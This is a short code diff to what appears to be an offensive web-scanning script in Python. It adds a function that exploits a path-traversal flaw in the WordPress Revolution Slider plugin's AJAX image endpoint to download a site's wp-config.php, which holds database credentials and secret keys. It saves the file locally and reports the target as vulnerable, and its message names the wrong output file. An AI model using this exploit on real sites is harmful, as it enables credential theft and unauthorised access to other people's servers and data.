@@ -101,3 +101,12 @@ def dirscan(target):
         t.start()
         time.sleep(0.1)
         
+def configdownload(target):
+        req = requests.get(target + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
+        if req.status_code == 200:
+            files = open('config.php', "w")
+            files.write(req.text)
+            print_sucess(f'Target {Fore.LIGHTGREEN_EX}IS{Fore.WHITE} Vulnerable')
+            print_sucess('Output saved to output.txt\n')
+        else:
+            print_error('Target isn\'t vulnerable\n')
